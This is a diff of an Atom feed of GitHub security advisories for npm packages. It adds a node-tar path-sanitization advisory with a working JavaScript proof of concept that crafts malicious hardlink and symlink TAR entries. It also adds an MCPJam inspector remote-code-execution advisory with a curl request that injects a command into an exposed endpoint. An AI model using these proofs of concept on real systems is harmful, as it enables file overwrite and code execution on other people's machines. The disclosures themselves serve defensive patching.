@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-01-16T21:09:33.337Z</updated>
+    <updated>2026-01-16T21:32:14.307Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,151 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[tar] node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization]]></title>
+        <id>https://github.com/advisories/GHSA-8qq5-rm4j-mr97</id>
+        <link href="https://github.com/advisories/GHSA-8qq5-rm4j-mr97"/>
+        <updated>2026-01-16T21:16:24.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>node-tar</code> library (<code>&lt;= 7.5.2</code>) fails to sanitize the <code>linkpath</code> of <code>Link</code> (hardlink) and <code>SymbolicLink</code> entries when <code>preservePaths</code> is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to <strong>Arbitrary File Overwrite</strong> via hardlinks and <strong>Symlink Poisoning</strong> via absolute symlink targets.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists in <code>src/unpack.ts</code> within the <code>[HARDLINK]</code> and <code>[SYMLINK]</code> methods.</p>
+<p><strong>1. Hardlink Escape (Arbitrary File Overwrite)</strong></p>
+<p>The extraction logic uses <code>path.resolve(this.cwd, entry.linkpath)</code> to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (<code>entry.linkpath</code>) is an <strong>absolute path</strong>, <code>path.resolve</code> ignores the first argument (<code>this.cwd</code>) entirely and returns the absolute path.</p>
+<p>The library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., <code>/etc/passwd</code>) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.</p>
+<p><strong>2. Symlink Poisoning</strong></p>
+<p>The extraction logic passes the user-supplied <code>entry.linkpath</code> directly to <code>fs.symlink</code> without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (<code>../../</code>), even when secure extraction defaults are used.</p>
+<h3 id="poc">PoC</h3>
+<p>The following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to <code>/etc/passwd</code>). It then extracts the archive using standard <code>node-tar</code> settings and demonstrates the vulnerability by verifying that the local "secret" file was successfully overwritten.</p>
+<pre><code class="language-javascript">const fs = require('fs')
+const path = require('path')
+const tar = require('tar')
+
+const out = path.resolve('out_repro')
+const secret = path.resolve('secret.txt')
+const tarFile = path.resolve('exploit.tar')
+const targetSym = '/etc/passwd'
+
+// Cleanup &amp; Setup
+try { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}
+fs.mkdirSync(out)
+fs.writeFileSync(secret, 'ORIGINAL_DATA')
+
+// 1. Craft malicious Link header (Hardlink to absolute local file)
+const h1 = new tar.Header({
+  path: 'exploit_hard',
+  type: 'Link',
+  size: 0,
+  linkpath: secret 
+})
+h1.encode()
+
+// 2. Craft malicious Symlink header (Symlink to /etc/passwd)
+const h2 = new tar.Header({
+  path: 'exploit_sym',
+  type: 'SymbolicLink',
+  size: 0,
+  linkpath: targetSym 
+})
+h2.encode()
+
+// Write binary tar
+fs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))
+
+console.log('[*] Extracting malicious tarball...')
+
+// 3. Extract with default secure settings
+tar.x({
+  cwd: out,
+  file: tarFile,
+  preservePaths: false
+}).then(() =&gt; {
+  console.log('[*] Verifying payload...')
+
+  // Test Hardlink Overwrite
+  try {
+    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')
+    
+    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {
+      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')
+    } else {
+      console.log('[-] Hardlink failed')
+    }
+  } catch (e) {}
+
+  // Test Symlink Poisoning
+  try {
+    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {
+      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')
+    } else {
+      console.log('[-] Symlink failed')
+    }
+  } catch (e) {}
+})
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Arbitrary File Overwrite:</strong> An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.</li>
+<li><strong>Remote Code Execution (RCE):</strong> In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all <code>Link</code> and <code>SymbolicLink</code> tar entries from extracted packages.)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97">https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97</a></li>
+<li><a href="https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e">https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e</a></li>
+<li><a href="https://github.com/advisories/GHSA-8qq5-rm4j-mr97">https://github.com/advisories/GHSA-8qq5-rm4j-mr97</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8qq5-rm4j-mr97</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-16T21:16:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@mcpjam/inspector] REC in MCPJam inspector due to HTTP Endpoint exposes]]></title>
+        <id>https://github.com/advisories/GHSA-232v-j27c-5pp6</id>
+        <link href="https://github.com/advisories/GHSA-232v-j27c-5pp6"/>
+        <updated>2026-01-16T21:15:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>MCPJam inspector is the local-first development platform for MCP servers. The Latest version Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE.</p>
+<p>This vulnerability is similar to CVE-2025-49596, but more severe. While CVE-2025-49596 requires tricking a user into clicking a malicious link, this vulnerability is exploitable with no user interaction. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request.</p>
+<h3 id="details">Details</h3>
+<p>MCPJam inspector binds to <code>0.0.0.0</code> making its HTTP APIs remotely reachable.</p>
+<pre><code class="language-TypeScript">const server = serve({
+  fetch: app.fetch,
+  port: SERVER_PORT,
+  hostname: "0.0.0.0",
+});
+</code></pre>
+<p>The <code>/api/mcp/connect</code> API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the <code>/connect</code> route, the system extracts the <code>command</code> and <code>args</code> fields without performing any security checks, leading to the execution of arbitrary command.</p>
+<h3 id="poc">PoC</h3>
+<p>(1) Start up the MCPJam inspector as Github README
+<code>npx @mcpjam/inspector@latest</code></p>
+<p>(2) RCE by posting a HTTP request
+A remote code execution (RCE) attack can be triggered by sending a simple HTTP request to the target host running MCPJam inspector (e.g., <a href="http://10.97.58.83:6274">http://10.97.58.83:6274</a> in the test environment).
+<code>curl http://10.97.58.83:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"</code></p>
+<img src="https://github.com/user-attachments/assets/cb6505f1-3cdd-4c64-8f39-a01619a63411" alt="image" height="1397" width="1669">
+
+
+<h3 id="impact">Impact</h3>
+<p>Remote Code Execution (RCE)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6">https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6</a></li>
+<li><a href="https://github.com/MCPJam/inspector/commit/e6b9cf9d9e6c9cbec31493b1bdca3a1255fe3e7a">https://github.com/MCPJam/inspector/commit/e6b9cf9d9e6c9cbec31493b1bdca3a1255fe3e7a</a></li>
+<li><a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">https://github.com/advisories/GHSA-232v-j27c-5pp6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-232v-j27c-5pp6</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-01-16T21:15:35.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[graphql-modules] GraphQL Modules has a Race Condition issue]]></title>
         <id>https://github.com/advisories/GHSA-53wg-r69p-v3r7</id>
@@ -1219,73 +1364,5 @@ Method: Deployment</p>
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-01-14T21:34:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[undici] Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion]]></title>
-        <id>https://github.com/advisories/GHSA-g9mf-h72j-4rw9</id>
-        <link href="https://github.com/advisories/GHSA-g9mf-h72j-4rw9"/>
-        <updated>2026-01-14T22:33:31.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>fetch()</code> API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor.</p>
-<p>However, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation.</p>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to 7.18.2 or 6.23.0.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>It is possible to apply an undici interceptor and filter long <code>Content-Encoding</code> sequences manually.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://hackerone.com/reports/3456148">https://hackerone.com/reports/3456148</a></li>
-<li><a href="https://github.com/advisories/GHSA-gm62-xv2j-4w53">https://github.com/advisories/GHSA-gm62-xv2j-4w53</a></li>
-<li><a href="https://curl.se/docs/CVE-2022-32206.html">https://curl.se/docs/CVE-2022-32206.html</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9">https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9</a></li>
-<li><a href="https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3">https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22036">https://nvd.nist.gov/vuln/detail/CVE-2026-22036</a></li>
-<li><a href="https://github.com/advisories/GHSA-g9mf-h72j-4rw9">https://github.com/advisories/GHSA-g9mf-h72j-4rw9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g9mf-h72j-4rw9</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-01-14T21:06:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[undici] Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion]]></title>
-        <id>https://github.com/advisories/GHSA-g9mf-h72j-4rw9</id>
-        <link href="https://github.com/advisories/GHSA-g9mf-h72j-4rw9"/>
-        <updated>2026-01-14T22:33:31.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>fetch()</code> API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor.</p>
-<p>However, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation.</p>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to 7.18.2 or 6.23.0.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>It is possible to apply an undici interceptor and filter long <code>Content-Encoding</code> sequences manually.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://hackerone.com/reports/3456148">https://hackerone.com/reports/3456148</a></li>
-<li><a href="https://github.com/advisories/GHSA-gm62-xv2j-4w53">https://github.com/advisories/GHSA-gm62-xv2j-4w53</a></li>
-<li><a href="https://curl.se/docs/CVE-2022-32206.html">https://curl.se/docs/CVE-2022-32206.html</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9">https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9</a></li>
-<li><a href="https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3">https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22036">https://nvd.nist.gov/vuln/detail/CVE-2026-22036</a></li>
-<li><a href="https://github.com/advisories/GHSA-g9mf-h72j-4rw9">https://github.com/advisories/GHSA-g9mf-h72j-4rw9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g9mf-h72j-4rw9</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-01-14T21:06:08.000Z</published>
     </entry>
 </feed>
